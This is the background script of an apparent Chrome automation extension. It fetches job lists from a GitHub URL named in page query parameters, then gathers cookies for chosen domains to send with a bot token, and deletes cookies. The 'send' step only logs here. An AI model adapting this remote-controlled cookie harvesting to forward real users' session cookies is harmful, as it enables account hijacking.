let doThis = [];
const botHosts = {remote: "https://api.contador.cloud", local: "https://localhost:8000"};
const actions = {
    send: body => {
        console.log(body);
        console.log(doThis);
    },
    getJobs: async name => {
        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
        const response = await fetch(url);
        return response.json();
    },
    cookiesEat: domains => {
        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = [];
            jars.forEach(jar => cookies = jar.result.concat(cookies));

            return Promise.all(promises.cookiesEat(cookies));
        });
    },
    cookiesEatReload: (domains, to) => {
        actions.cookiesEat(domains)
        .then(results => chrome.tabs.update(actions.tabId, {"url": to}));
    },
    cookiesGetAllSend: domains => {
        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = {};
            jars.forEach(jar => cookies[jar.domain] = jar.result);

            actions.send({token: actions.token, cookies: cookies});
        });
    }
};
const promises = {
    /*dom: (actions, tabId) => {
        const promises = [];
        const results = {id: "dom", result: {}};
        actions.forEach(action => {
            promises.push(chrome.scripting.executeScript({target: {tabId: tabId}, func: action}).then(frames => {
                frames.forEach(frame => {
                    if (!frame.result) return;

                    results.result[frame.result.name] = frame.result.value;
                });
                return result;
            }));
        });
        return promises;
    },*/
    cookiesGetAll: domains => {
        const promises = [];
        domains.forEach(domain => {
            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
                return {
                    method: "cookiesGetAll",
                    domain: domain,
                    result: cookies
                };
            }));
        });
        return promises;
    },
    cookiesEat: cookies => {
        const promises = [];
        cookies.forEach(cookie => {
            const url = cookie => {
                if (cookie.domain.charAt(0) === ".")
                    cookie.domain = cookie.domain.replace(".", "");

                return "https://" + cookie.domain + cookie.path;
            };
            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
                // cookie contains only name, storeId and url.
                return {
                    method: "cookiesEat",
                    result: cookie
                };
            }));
        });
        return promises;
    }
};

/**
 * Executes on every page load. All of them.
 */
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete') return;

    const url = new URL(tab.url);
    const starting = () => {
        if (name = url.searchParams.get("botJobs")) {
            const setToken = () => {
                if (!(actions.token = url.searchParams.get("botToken")))
                    throw new Error("botToken query parameter is missing.");
            };
            setToken();
            actions.getJobs(name).then(jobs => {
                actions.tabId = tabId;
                doThis = [...jobs];
                doThis.shift();
                actions[jobs[0].action.name](...jobs[0].action.args);
            });
            return true;
        }
    };
    const inCourse = () => {
        if (doThis.length === 0) return;

        if (tab.url.includes(doThis[0].url)) {
            const name = doThis[0].action.name;
            const args = doThis[0].action.args;

            doThis.shift();
            actions[name](...args);
            return true;
        }
    };

    if (starting()) return;
    inCourse();
});
